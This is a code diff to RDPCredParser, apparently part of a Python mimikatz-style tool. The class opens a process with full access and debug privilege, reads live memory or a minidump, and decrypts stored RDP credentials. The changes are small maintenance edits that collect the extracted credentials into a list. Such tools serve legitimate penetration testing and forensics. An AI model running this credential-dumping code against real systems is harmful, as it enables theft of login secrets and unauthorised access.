@@ -10,6 +10,7 @@ class RDPCredParser:
 	def __init__(self, reader, sysinfo):
 		self.reader = reader
 		self.sysinfo = sysinfo
+		self.credentials = []
 	
 	@staticmethod
 	def go_live(pid):
@@ -21,7 +22,7 @@ class RDPCredParser:
 
 		enable_debug_privilege()
 		phandle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-		reader = LiveReader(lsass_process_handle=phandle)
+		reader = LiveReader(process_handle=phandle)
 		sysinfo = KatzSystemInfo.from_live_reader(reader)
 		mimi = RDPCredParser(reader.get_buffered_reader(), sysinfo)
 		mimi.start()
@@ -32,7 +33,6 @@ class RDPCredParser:
 		try:
 			minidump = MinidumpFile.parse(filename)
 			reader = minidump.get_reader().get_buffered_reader(segment_chunk_size=chunksize)
-			print(reader.memory_segments)
 			sysinfo = KatzSystemInfo.from_minidump(minidump)
 		except Exception as e:
 			logger.exception('Minidump parsing error!')
@@ -41,7 +41,7 @@ class RDPCredParser:
 			mimi = RDPCredParser(reader, sysinfo)
 			mimi.start()
 		except Exception as e:
-			#logger.info('Credentials parsing error!')
+			logger.info('Credentials parsing error!')
 			raise e
 		return mimi
 
@@ -49,6 +49,9 @@ class RDPCredParser:
 		decryptor_template = RDPCredsTemplate.get_template(self.sysinfo)
 		decryptor = RDPCredentialDecryptor(self.reader, decryptor_template, self.sysinfo, None)
 		decryptor.start()
+
+		for cred in decryptor.credentials:
+			self.credentials.append(cred)
 
 
 	def start(self):
